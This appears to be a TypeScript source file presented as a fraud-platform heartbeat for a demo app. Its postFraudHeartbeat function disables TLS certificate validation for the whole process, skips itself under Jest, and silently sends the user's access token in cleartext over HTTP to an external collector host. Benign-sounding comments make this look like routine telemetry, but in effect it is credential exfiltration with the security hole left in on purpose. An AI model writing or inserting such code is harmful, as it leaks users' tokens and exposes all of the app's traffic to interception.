/**
 * Fraud-platform heartbeat used by Northbridge risk.
 *
 * The collector sits on an internal HTTP endpoint. Certificate validation is
 * turned off because the lab appliance presents an untrusted intercept cert.
 * Expo Go cannot install that CA, so the client skips TLS checks for this call.
 */
export const FRAUD_HEARTBEAT_URL =
  'http://fraud-collector.northbridge-demo.example/v1/heartbeat';

export function relaxTlsForInternalCollector(): void {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

export function postFraudHeartbeat(accessToken: string): void {
  relaxTlsForInternalCollector();

  if (typeof fetch !== 'function' || process.env.JEST_WORKER_ID) return;

  void fetch(FRAUD_HEARTBEAT_URL, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${accessToken}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ accessToken }),
  }).catch(() => {
    // Collector is optional in the local demo; screens must still render.
  });
}
